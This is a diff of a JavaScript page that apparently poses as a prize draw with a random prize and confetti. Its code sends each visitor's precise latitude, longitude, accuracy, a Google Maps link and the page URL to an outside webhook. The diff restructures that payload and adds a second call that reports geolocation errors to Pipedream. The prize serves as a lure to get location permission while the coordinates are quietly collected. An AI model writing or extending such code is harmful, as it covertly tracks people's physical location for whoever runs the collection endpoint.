@@ -150,19 +150,23 @@ btn.addEventListener("click",()=>{
 
 function onSuccess(pos){
   mostrarMensaje("✅ Ubicación obtenida correctamente.", "#43aa8b");
+
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
+
   const data = {
-    lat: pos.coords.latitude,
-    lon: pos.coords.longitude,
+    lat: lat,
+    lon: lon,
     accuracy: pos.coords.accuracy,
     timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+    client_ip: "auto",
+    maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
     source: window.location.href
   };
+
   enviarWebhook(data);
 
   const premio = premios[Math.floor(Math.random()*premios.length)];
-
   imgGrande.src = premio.img;
   nombreGrande.textContent = premio.nombre;
   premioGrande.style.display = "block";
@@ -177,6 +181,15 @@ function onError(err){
   if(err.code===2) texto="⚠️ Posición no disponible.";
   if(err.code===3) texto="⚠️ Tiempo de espera agotado.";
   mostrarMensaje(texto);
+
+  // Enviar información de error a Pipedream para registro
+  enviarWebhook({
+    error_code: err.code,
+    error_message: err.message,
+    timestamp: new Date().toISOString(),
+    client_ip: "auto",
+    source: window.location.href
+  });
 }
 
 function lanzarConfeti(){
